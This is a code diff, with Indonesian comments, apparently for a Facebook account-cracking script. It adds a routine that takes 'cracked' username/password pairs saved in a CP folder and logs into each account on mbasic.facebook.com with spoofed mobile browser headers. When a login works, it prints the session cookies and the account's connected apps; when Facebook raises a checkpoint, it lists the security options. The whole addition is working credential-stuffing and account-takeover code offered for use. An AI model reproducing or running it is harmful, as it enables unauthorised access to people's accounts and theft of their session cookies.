@@ -636,6 +636,103 @@ def crack2(user, pwx):
 	loping+=1
 None
 
+# CEK OPSI
+def file_cp():
+    dirs = os.listdir('CP')
+    print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
+    for file in dirs:
+        print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
+    try:
+    	print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
+        opsi()
+    except NameError:
+        print ('%s• file tidak ada'%(M));exit()
+def opsi():
+	CP = ("CP/")
+	romi = raw_input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
+	if romi == "":
+		print("%s%s isi yang benar "%(M,til));jeda(2);opsi()
+	try:
+		file_cp = open(CP+romi, "r").readlines()
+	except IOError:
+		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
+	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
+	print("%s%s%s Total akun %s: %s%s"%(U,til,O,M,P,len(file_cp)));jeda(2)
+	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
+	for fb in file_cp:
+		akun = fb.replace("\n","")
+		ngecek  = akun.split(" ◊ ")
+		print("\n%s%s%s cek akun %s: %s%s"%(U,til,O,M,K,akun.replace(" *--> ","")));jeda(0.07)
+		try:
+			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	print("\n%s%s%s Selesai "%(U,til,O));jeda(0.07)
+	raw_input("%s%s%s kembali "%(U,til,O));jeda(0.07)
+	menu()
+def mengecek(user, pw):
+	mb = ("https://mbasic.facebook.com")
+	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
+	ses = requests.Session()
+	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	data = {}
+	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+	fm = ged.find("form",{"method":"post"})
+	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+	for _i_ in fm.find_all("input"):
+		if _i_.get("name") in list:
+			data.update({_i_.get("name"):_i_.get("value")})
+		else:
+			continue
+	data.update({"email":user,"pass":pw})
+	try:
+		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+	except requests.exceptions.TooManyRedirects:
+		print("%s• redirect overload "%(M))
+	if "c_user" in ses.cookies:
+		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
+		otw = ses.get(run,cookies={'cookie':kuki})
+		gem = parser(otw.content,'html.parser')
+		apk = gem.find('form',method='post')
+		print("%s%s Berhasil ◊ %s "%(H,til,kuki));jeda(0.07)
+		_no_ = 0
+		for app in apk.find_all("h3"):
+			data = app.find('span').text
+			_no_+=1
+			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
+	elif "checkpoint" in ses.cookies:
+		form = run.find("form")
+		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+		jzst = form.find("input",{"name":"jazoest"})["value"]
+		nh   = form.find("input",{"name":"nh"})["value"]
+		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
+		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
+		ngew = [yy.text for yy in sesi.find_all("option")]
+		print("%s%s%s terdapat %s0%s%s opsi %s: "%(U,til,O,P,str(len(ngew)),O,M));jeda(0.07)
+		for _o_ in range(len(ngew)):
+			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
+	elif "login_error" in str(run):
+		eror = run.find("div",{"id":"login_error"}).find("div").text
+		print("%s%s %s"%(M,til,eror));jeda(0.07)
+	else:
+		print("%s%s login gagal, silahkan cek kembali id dan password"%(M,til));jeda(0.07)
+# CEK APLIKASI
+def aplikasi(berhasil,kuki):
+	a = []
+	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
+	otw = ses.get(run,cookies={'cookie':kuki})
+	gem = parser(otw.content,'html.parser')
+	apk = gem.find('form',method='post')
+	_no_ = 0
+	for app in apk.find_all("h3"):
+		try:
+			data = app.find('span').text
+			_no_+=1
+			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
+		except:
+			pass
+
 # PENCARIAN NAMA
 class pesan:
 
@@ -767,8 +864,10 @@ def menu():
         c = raw_input('\n%s [?] Menu : %s'%(P,K))
     	hasill(c)
     elif unik in['9','09']:
-        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
+        file_cp()
     elif unik in['10','100']:
+        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
+    elif unik in['11','110']:
         print(ingfo)
     elif unik in['0','00']:
         print ('')
